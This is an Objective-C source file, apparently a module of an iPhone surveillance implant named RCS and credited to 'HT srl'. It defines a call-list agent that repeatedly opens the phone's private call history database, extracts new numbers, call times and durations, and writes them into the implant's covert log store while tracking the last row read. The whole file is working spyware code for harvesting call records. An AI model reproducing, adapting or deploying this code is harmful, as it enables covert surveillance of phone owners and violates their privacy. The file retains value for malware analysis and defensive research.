/*
 *  RCSIAgentCallList.m
 *  RCSIphone
 *
 *  Created by Alfredo 'revenge' Pesoli on 5/18/11.
 *  Copyright 2011 HT srl. All rights reserved.
 */

#import <sqlite3.h>
#import <objc/runtime.h>

#import "RCSILogManager.h"
#import "RCSIAgentCallList.h"

//#define DEBUG

NSString *k_i_AgentCallListRunLoopMode = @"k_i_AgentCallListRunLoopMode";

#define CALL_LIST_DB_4x "/private/var/wireless/Library/CallHistory/call_history.db"
#define CALL_LIST_DB_3x "/private/var/mobile/Library/CallHistory/call_history.db"

typedef struct _callListAdditionalHeader {
  u_int size;     // size of standard + optional fields
  u_int version;  // guess is 0
  u_int loStartTime;
  u_int hiStartTime;
  u_int loEndTime;
  u_int hiEndTime;
  u_int properties;
// Got from win mobile...
#define CALLLIST_TYPE_MASK        0x00FFFFFF
#define CALLLIST_STRING_NAME      0x01000000
#define CALLLIST_STRING_NAMETYPE  0x02000000
#define CALLLIST_STRING_NOTE      0x04000000
#define CALLLIST_STRING_NUMBER    0x08000000
} callListAdditionalStruct;


@interface _i_AgentCallList (hidden)

- (void)_getCallList;
- (void)_logCallList: (NSMutableArray *)callList;
- (void)_saveLastTimestamp;
- (BOOL)_getLastSavedTimestamp;

@end

@implementation _i_AgentCallList (hidden)

- (void)_getCallList
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  int rc = 0;
  sqlite3 *db;
  char stmt[1024];
  
  if ([self isThreadCancelled] == TRUE)
    {
      [outerPool release];
      return;
    }
  
  if (gOSMajor == 3)
    {
      rc = sqlite3_open(CALL_LIST_DB_3x, &db);
    
      if (rc)
        {
          [outerPool release];
          sqlite3_close(db);
          return;
        }
      
    }
  else if (gOSMajor == 4 || gOSMajor == 5)
    {
      rc = sqlite3_open(CALL_LIST_DB_4x, &db);
    
      if (rc)
        {
          [outerPool release];
          sqlite3_close(db);
          return;
        }
    }
  else
    {
      return;
    }

  if ([self isThreadCancelled] == TRUE)
    {
      sqlite3_close(db);
      [outerPool release];
      return;
    }
  
  [self _getLastSavedTimestamp];
  
  if (mLastCallTimestamp == 0)
    sprintf(stmt, "SELECT * from call");
  else
    sprintf(stmt, "SELECT * from call where rowid > '%d'",  mLastCallTimestamp);
  
  if ([self isThreadCancelled] == TRUE)
    {
      sqlite3_close(db);
      [outerPool release];
      return;
    }
  
  NSMutableArray *results = rcs_sqlite_do_select(db, stmt);
  
  if ([self isThreadCancelled] == TRUE)
    {
      sqlite3_close(db);
      [outerPool release];
      return;
    }
  
  if (results != nil)
    {
      [self _logCallList: results];
      [self _saveLastTimestamp];
    }

  sqlite3_close(db);
  
  [outerPool release];

  return;
}

- (void)_logCallList: (NSMutableArray *)callList
{
  if (callList == nil)
    return;

  for (NSMutableDictionary *item in callList)
    {
      if ([self isThreadCancelled] == TRUE)
        return;
    
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      NSMutableData *logData = [[NSMutableData alloc] init];

      if ([item objectForKey: @"duration"] == nil)
        {
          continue;
        }
      if ([item objectForKey: @"date"] == nil)
        {
          continue;
        }
    
      int32_t timestamp = [[item objectForKey: @"ROWID"] intValue];
    
      if (mLastCallTimestamp == 0 || timestamp > mLastCallTimestamp)
        mLastCallTimestamp = timestamp;
    
      int32_t duration  = [[item objectForKey: @"duration"] intValue];
      int64_t unixStart = [[item objectForKey: @"date"] longLongValue];
      int64_t unixEnd   = unixStart + duration;
      int64_t started   = ((int64_t)unixStart * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      int64_t ended     = ((int64_t)unixEnd * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;

      callListAdditionalStruct *agentAdditionalHeader;
      NSMutableData *rawAdditionalHeader = [[NSMutableData alloc]
        initWithLength: sizeof(callListAdditionalStruct)];
      agentAdditionalHeader = (callListAdditionalStruct *)[rawAdditionalHeader bytes];

      agentAdditionalHeader->size         = sizeof(callListAdditionalStruct);
      agentAdditionalHeader->version      = 0;
      agentAdditionalHeader->loStartTime  = (int64_t)started & 0xFFFFFFFF;
      agentAdditionalHeader->hiStartTime  = (int64_t)started >> 32;
      agentAdditionalHeader->loEndTime    = (int64_t)ended & 0xFFFFFFFF;
      agentAdditionalHeader->hiEndTime    = (int64_t)ended >> 32;
      agentAdditionalHeader->properties   = 0;

      int32_t flags = [[item objectForKey: @"flags"] intValue];
      if (flags == 5)
        agentAdditionalHeader->properties |= 0x01;
      if (duration > 0)
        agentAdditionalHeader->properties |= 0x02;

      NSString *number = [item objectForKey: @"address"];
      uint32_t len = [number lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
      int32_t prefix = CALLLIST_STRING_NUMBER | (len & 0x00FFFFFF);

      agentAdditionalHeader->size += sizeof(prefix)
                                     + len
                                     + sizeof(uint32_t) * 6; // Add empty strings
      [logData appendData: rawAdditionalHeader];

      // Append number
      [logData appendBytes: &prefix
                    length: sizeof(int32_t)];
      [logData appendData: [number dataUsingEncoding:
        NSUTF16LittleEndianStringEncoding]];

      NSMutableData *empty = [[NSMutableData alloc] initWithLength: sizeof(uint32_t)];
      
      // Append nil name
      // prefix
      [logData appendData: empty];
      // name
      [logData appendData: empty];

      // Append nil name type
      // prefix
      [logData appendData: empty];
      // name type
      [logData appendData: empty];

      // Append nil note
      // prefix
      [logData appendData: empty];
      // note
      [logData appendData: empty];

      [empty release];

      _i_LogManager *logManager = [_i_LogManager sharedInstance];
      BOOL success = [logManager createLog: LOG_CALL_LIST
                               agentHeader: nil
                                 withLogID: 0];

      if (success == NO)
        {
          [logData release];
          [rawAdditionalHeader release];
          continue;
        }

      if ([logManager writeDataToLog: logData
                            forAgent: LOG_CALL_LIST
                           withLogID: 0] == FALSE)
        {
          [logData release];
          [rawAdditionalHeader release];
          continue;
        }

      [logManager closeActiveLog: LOG_CALL_LIST
                       withLogID: 0];

      [logData release];
      [rawAdditionalHeader release];
      [innerPool release];
    }
}

- (void)_saveLastTimestamp
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  if (mLastCallTimestamp == 0)
    {
      [pool release];
      return;
    }
  
  NSNumber *number = [[NSNumber alloc] initWithDouble: mLastCallTimestamp];
  
  NSDictionary *dict = 
    [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: number, nil]
                                  forKeys: [NSArray arrayWithObjects: @"CL_LAST", nil]];
  
  NSDictionary *agentDict = 
    [[NSDictionary alloc] initWithObjects: [NSArray arrayWithObjects: dict, nil]
                                  forKeys: [NSArray arrayWithObjects: [[self class] description], nil]];
  
  setRcsPropertyWithName([[self class] description], agentDict);
  
  [agentDict release];
  [dict release];
  [number release];
  [pool release];
}

- (BOOL)_getLastSavedTimestamp
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  NSDictionary *agentDict = rcsPropertyWithName([[self class] description]);
  
  if (agentDict == nil) 
    {
      return NO;
    }
  else 
    {
      mLastCallTimestamp = [[agentDict objectForKey: @"CL_LAST"] unsignedIntValue];
      [agentDict release];
    }

  [outerPool release];
  return YES;
}

@end

@implementation _i_AgentCallList

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)initWithConfigData:(NSData*)aData
{
  self = [super initWithConfigData:aData];

  if (self != nil)
    {
      mLastCallTimestamp  = 0;
      mAgentID            = AGENT_CALL_LIST;
    }
  
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)getCallList:(NSTimer*)theTimer
{
  [self _getCallList];
}

- (void)setCallListPollingTimeout:(NSTimeInterval)aTimeOut
{
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getCallList:) 
                                                  userInfo: nil 
                                                   repeats: NO];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentCallListRunLoopMode];
}

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE)
    {
      [self setMAgentStatus: AGENT_STATUS_STOPPED];
      [outerPool release];
      return;
    }
  
  [self setCallListPollingTimeout: 5.0];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      [[NSRunLoop currentRunLoop] runMode: k_i_AgentCallListRunLoopMode 
                               beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.0]];
        
      [innerPool release];
    }
  
  [self setMAgentStatus: AGENT_STATUS_STOPPED];
  
  [outerPool release];
}
  
- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}

@end
